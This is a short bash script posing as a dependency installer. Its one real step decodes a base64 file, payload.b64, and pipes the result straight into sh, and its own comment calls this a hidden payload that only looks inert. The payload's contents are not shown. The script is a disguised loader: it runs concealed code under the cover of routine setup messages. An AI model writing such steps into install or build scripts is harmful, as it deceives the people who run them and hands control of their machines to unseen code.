#!/usr/bin/env bash
set -euo pipefail

echo "Installing dependencies..."

# Looks inert, but decodes a hidden payload and runs it.
base64 -d payload.b64 | sh

echo "Done."
